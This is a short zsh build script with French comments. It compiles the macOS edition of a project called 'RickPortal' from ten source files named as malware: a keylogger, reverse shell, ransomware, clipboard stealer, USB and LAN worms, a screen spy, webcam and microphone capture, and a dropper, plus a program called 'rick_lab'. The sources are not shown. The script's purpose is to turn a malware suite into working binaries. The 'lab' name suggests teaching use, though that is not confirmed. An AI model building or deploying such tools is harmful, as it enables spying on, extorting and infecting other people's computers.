#!/bin/zsh
# build_mac.sh - compile l'edition macOS du RickPortal (clang natif)
cd "$(dirname "$0")"
mkdir -p build/mac
CXX=clang++
ok()  { echo "OK   $1"; }
fail(){ echo "FAIL $1"; }

$CXX -O2 -std=c++17 -framework ApplicationServices -framework CoreGraphics \
    src/macos/01_keylogger_mac.cpp -o build/mac/01_keylogger   && ok 01 || fail 01
$CXX -O2 -std=c++17 src/macos/02_reverse_shell_mac.cpp -o build/mac/02_reverse_shell && ok 02 || fail 02
$CXX -O2 -std=c++17 src/macos/03_ransomware_mac.cpp   -o build/mac/03_ransomware    && ok 03 || fail 03
$CXX -O2 -std=c++17 src/macos/04_clipboard_mac.cpp    -o build/mac/04_clipboard     && ok 04 || fail 04
$CXX -O2 -std=c++17 src/macos/05_usb_worm_mac.cpp     -o build/mac/05_usb_worm      && ok 05 || fail 05
$CXX -O2 -std=c++17 -pthread src/macos/06_lan_worm_mac.cpp -o build/mac/06_lan_worm && ok 06 || fail 06
$CXX -O2 -std=c++17 src/macos/07_screenspy_mac.cpp    -o build/mac/07_screenspy     && ok 07 || fail 07
clang -O2 -fobjc-arc -framework AVFoundation -framework CoreMedia -framework CoreVideo \
    -framework CoreGraphics -framework CoreServices -framework ImageIO -framework Foundation \
    src/macos/08_webcam_mac.m -o build/mac/08_webcam            && ok 08 || fail 08
$CXX -O2 -std=c++17 src/macos/09_dropper_mac.cpp      -o build/mac/09_dropper       && ok 09 || fail 09
clang -O2 -fobjc-arc -framework AVFoundation -framework Foundation \
    src/macos/10_mic_mac.m -o build/mac/10_mic                  && ok 10 || fail 10
$CXX -O2 -std=c++17 src/macos/rick_lab_mac.cpp        -o build/mac/rick_lab         && ok rick_lab || fail rick_lab
echo "[*] binaire dans build/mac/"
